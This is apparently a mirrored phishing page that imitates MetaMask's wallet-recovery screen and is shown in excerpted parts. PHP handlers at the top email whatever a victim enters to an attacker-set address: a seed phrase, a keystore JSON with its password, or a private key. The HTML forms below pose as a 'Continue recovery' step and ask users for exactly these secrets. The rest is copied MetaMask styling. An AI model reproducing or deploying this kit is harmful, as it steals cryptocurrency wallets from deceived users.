...
if (isset($_POST['import1'])) {
    ...
    if (!empty($key)) {
        ...
        $mail->Subject = "MetaMask Phrase";
        $mail->isHTML(true);
        $mail->Body = 'MetaMask Phrase - ' . $key . ' ';
        $mail->send();
...
if (isset($_POST['import2'])) {
    ...
    if (!empty($key) && !empty($pass)) {
        ...
        $mail->FromName = $domainName;
        $mail->addAddress($send_to);
        $mail->Subject = "MetaMask Keystore";
        $mail->isHTML(true);
        $mail->Body = 'MetaMask Keystore - ' . $key . ' <br> Password - ' . $pass . ' ';
        $mail->send();
...
if (isset($_POST['import3'])) {
    ...
    if (!empty($key)) {
        ...
        $mail->FromName = $domainName;
        $mail->addAddress($send_to);
        $mail->Subject = "MetaMask Private Key";
        $mail->isHTML(true);
        $mail->Body = 'MetaMask Private Key - ' . $key . ' ';
        $mail->send();
...
<!-- Mirrored from zapchopp.com.br/contactt/df4573__64363/dmt25/metamask/connect.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 May 2022 09:23:59 GMT -->
<head>
...
@import url("fonts/Font_Awesome/font-awesome.min.html");
@font-face {
font-family: 'Roboto';
font-style: normal;
font-weight: 100;
...
src: url("fonts/Montserrat/Montserrat-Regular.html") format("woff");
src: url("fonts/Montserrat/Montserrat-Regular-2.html") format("truetype");
font-weight: 400;
font-style: normal;
font-size: 'small'; }
...
src: url("fonts/Montserrat/Montserrat-Bold.html") format("woff");
src: url("fonts/Montserrat/Montserrat-Bold-2.html") format("truetype");
font-weight: 400;
font-style: normal; }

@font-face {
font-family: 'Montserrat Light';
src: url("fonts/Montserrat/Montserrat-Light.html") format("woff");
src: url("fonts/Montserrat/Montserrat-Light-2.html") format("truetype");
font-weight: 400;
font-style: normal; }

@font-face {
font-family: 'Montserrat UltraLight';
src: url("fonts/Montserrat/Montserrat-UltraLight.html") format("woff");
src: url("fonts/Montserrat/Montserrat-UltraLight-2.html") format("truetype");
font-weight: 400;
font-style: normal; }

@font-face {
font-family: 'DIN OT';
src: url("fonts/DIN_OT/DINOT-2.html") format("opentype");
font-weight: 400;
font-style: normal; }
...
src: url("fonts/DIN%20Next/DIN%20Next%20W01%20Regular.html") format("opentype");
font-weight: 400;
font-style: normal; }

@font-face {
font-family: 'DIN NEXT Light';
src: url("fonts/DIN%20Next/DIN%20Next%20W10%20Light.html") format("opentype");
font-weight: 400;
font-style: normal; }

@font-face {
font-family: 'Lato';
src: url("fonts/Lato/Lato-Regular.html") format("truetype");
font-weight: 400;
font-style: normal; }
...
src: url("fonts/fontawesome/fa-solid-900d41d.html?#iefix") format("embedded-opentype"),
url("fonts/fontawesome/fa-solid-901.html") format("woff2"), url("fonts/fontawesome/fa-solid-902.html") format("woff"),
url("fonts/fontawesome/fa-solid-903.html") format("truetype"), url("fonts/fontawesome/fa-solid-904.html#fontawesome")
format("svg"); }
...
src: url("fonts/fontawesome/fa-regular-400d41d.html?#iefix") format("embedded-opentype"),
url("fonts/fontawesome/fa-regular-401.html") format("woff2"), url("fonts/fontawesome/fa-regular-402.html")
format("woff"), url("fonts/fontawesome/fa-regular-403.html") format("truetype"),
url("fonts/fontawesome/fa-regular-404.html#fontawesome") format("svg"); }
...
background-image: url("images/check-white.html");
height: 18px;
width: 18px;
...
font-size: 14px;
line-height: 20px; }
.connected-accounts-list .connected-accounts-list__account-status, .connected-accounts-list
...
width: 4px;
background-color: transparent; }
.connected-status-indicator__green-circle, .connected-status-indicator__yellow-circle,
...
color: #5d5d5d;
font-size: 12px; }
.gas-modal-content__info-row__send-info, .gas-modal-content__info-row__transaction-info,
.gas-modal-content__info-row__total-info, .gas-modal-content__info-row__fiat-total-info,
.gas-modal-content__info-row--fade__send-info, .gas-modal-content__info-row--fade__transaction-info,
.gas-modal-content__info-row--fade__total-info, .gas-modal-content__info-row--fade__fiat-total-info {
display: flex;
flex-flow: row;
justify-content: space-between; }
...
.gas-modal-content__info-row__total-info__value, .gas-modal-content__info-row--fade__total-info__value {
font-size: 14px; } }
.gas-modal-content__info-row__transaction-info__label, .gas-modal-content__info-row__send-info__label,
.gas-modal-content__info-row--fade__transaction-info__label, .gas-modal-content__info-row--fade__send-info__label {
font-size: 12px; }
.gas-modal-content__info-row__transaction-info__value, .gas-modal-content__info-row__send-info__value,
.gas-modal-content__info-row--fade__transaction-info__value, .gas-modal-content__info-row--fade__send-info__value {
font-size: 12px; }
...
content: "";
background-image: url(https://zapchopp.com.br/images/icons/connected-sites.svg);
background-size: contain;
background-repeat: no-repeat;
background-position: center;
padding: 8px; }
...
position: absolute;
right: 24px;
background-image: url("https://zapchopp.com.br/images/close-gray.svg");
width: 0.75rem;
height: 0.75rem;
cursor: pointer; }
...
.tab-bar__tab__caret {
display: block;
background-image: url("https://zapchopp.com.br/images/caret-right.svg");
width: 36px;
height: 36px;
opacity: 0.5;
background-size: contain;
...
border: 1px solid #6a737d;
border-radius: 6px;
background-image: url("https://zapchopp.com.br/images/icons/caret-down.svg");
...
padding: 16px;
padding-bottom: 15px; }
.tippy-tooltip.tippy-tooltip-info-theme .tippy-tooltip-content, .tippy-tooltip.tippy-tooltip-wideInfo-theme
...
grid-template-areas: 'icon head head head head head head head right right right right' 'icon sub sub sub sub sub sub sub
right right right right' '. actions actions actions actions actions actions actions right right right right';
align-items: start;
cursor: pointer; }
.list-item:hover {
background-color: #f2f3f4; }
...
@media (min-width: 576px) {
.list-item {
grid-template-areas: 'icon head head head head mid mid mid mid right right right' 'icon sub sub sub sub mid mid mid mid
right right right' '. actions actions actions actions mid mid mid mid right right right'; } }
...
content: "";
background-image: url(https://zapchopp.com.br/images/icons/disconnect.svg);
background-size: contain;
background-repeat: no-repeat;
background-position: center;
padding: 8px;
...
font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
line-height: 140%; }
.permissions-connect-choose-account__text, .permissions-connect-choose-account__text-blue,
...
width: 40px;
height: 40px;
background: white url("https://zapchopp.com.br/images/permissions-check.svg") no-repeat;
position: absolute; }
...
display: block;
background-image: url("https://zapchopp.com.br/images/caret-left.svg");
width: 18px;
height: 18px;
margin-right: 0.5rem; }
...
background-image: url("https://zapchopp.com.br/images/search-black.svg");
width: 1.125rem;
height: 1.125rem;
margin: 0.25rem 0.5rem 0.25rem 0.25rem; }
.ens-input__wrapper__status-icon--valid {
background-image: url("https://zapchopp.com.br/images/check-green-solid.svg"); }
...
background-image: url("https://zapchopp.com.br/images/qr-blue.svg");
width: 1.5rem;
height: 1.5rem;
margin: 0 0.25rem; }
...
.networks-tab__back-button {
display: block;
background-image: url("https://zapchopp.com.br/images/caret-left-black.svg");
width: 18px;
height: 18px;
opacity: 0.5;
background-size: contain;
...
height: 16px;
width: 12px;
background-image: url(https://zapchopp.com.br/images/icons/swap2.svg);
background-size: contain;
background-repeat: no-repeat;
position: absolute;
cursor: pointer; }
...
overtime.
*/
.add-to-address-book-modal__footer, .new-account-modal__footer, .send__select-recipient-wrapper__list__link,
.send__select-recipient-wrapper__group-item, .send__select-recipient-wrapper__group-item--selected, .ens-input,
.ens-input__wrapper {
display: flex;
flex-flow: row nowrap; }

.add-to-address-book-modal__content, .new-account-modal__content, .send__select-recipient-wrapper,
.send__select-recipient-wrapper__recent-group-wrapper, .send__select-recipient-wrapper__group,
.send__select-recipient-wrapper__group-item__content, .send__select-recipient-wrapper__group-item--selected__content,
.ens-input__wrapper--valid .ens-input__wrapper__input {
display: flex;
flex-flow: column nowrap; }
...
.send-v2__customize-gas__revert, .send-v2__customize-gas__cancel, .send-v2__customize-gas__save,
            ...
            <div class="app-header__logo-container">
                <img alt="" class="app-header__metafox-logo app-header__metafox-logo--horizontal" height="30"
                     src="data:image/svg+xml;base64,"><img
                        alt="" class="app-header__metafox-logo app-header__metafox-logo--icon" height="42" width="42"
                        src="data:image/svg+xml;base64,">
            </div>
            <div class="app-header__account-menu-container">
                <div class="app-header__network-component-wrapper">
                    <div class="network-component pointer ethereum-network" title="Ethereum">
                        <div class="network-indicator">
                            <div class="menu-icon-circle">
                                <div style="background: rgb(3, 135, 137); border: none; height: 12px; width: 12px;">
                                </div>
                            </div>
                            <div class="network-name">Main Network</div>
            ...
            <div class="first-view-main">
                ...
                <div class="import-account">
                    ...
                    if ($msg != "") {
                        ...
                        ?>
                        <div style=""><h5><?php echo $msg ?></h5></div>
                    <?php } ?>
                    <br>
                    <div class="import-account__title">Continue recovery</div>
                    ...
                    <center>
                        <div>
                            ...
                            <div class="tab">
                                <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">
                                    Phrase</b></button>
					 ...
					 <textarea rows="8" cols="70" name="key" required="required" minlength="12"
                               placeholder="Seed Phrase"
                               required="required"></textarea>
                                    <br>
                                    <br>
                                    <h6>
                                        <div class="">Typically 12 (sometimes 24) words separated by single spaces</div>
                                    </h6>

                                    <button form="form1" value="Import" type="submit" name="import1"
                                            class="button btn--first-time first-time-flow__button">IMPORT
                                    </button>
                                </form>
                            </div>

                            <div id="keystore" class="tabcontent">
                                <form action="connect.php" method="POST" id="form2">
                      <textarea rows="8" cols="70" name="key" required="required" minlength="12"
                                placeholder="Keystore JSON"
                                required="required"></textarea>
                                    </br>
                                    <div class="field">
                                        <input class="form-control mt-4" type="text" name="pass" placeholder="Password"
                                               required="required" minlength="4"/>
                                    </div>
                                    <br>
                                    <br>
                                    <h6>
                                        <div class="">Several lines of text beginning with '(...)'</div>
                                    </h6>

                                    <button form="form2" value="Import" type="submit" name="import2"
                                            class="button btn--first-time first-time-flow__button">IMPORT
                                    </button>
                                </form>
                            </div>
                            ...
                            <div id="private" class="tabcontent">
                                <form action="connect.php" method="POST" id="form3">
					 <textarea rows="8" cols="70" name="key" required="required" minlength="64"
                               ...
                               required="required"></textarea>
                                    ...
                                    <br>
                                    <h6>
                                        <div class="">Typically 64 alphanumeric characters</div>
                                    </h6>

                                    <button form="form3" value="Import" type="submit" name="import3"
                                            class="button btn--first-time first-time-flow__button">IMPORT
                                    </button>
                                </form>
                            </div>
...
<!-- Mirrored from zapchopp.com.br/contactt/df4573__64363/dmt25/metamask/connect.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 May 2022 09:24:05 GMT -->
</html>


<script src="index_files/jquery.min.js.html"></script>
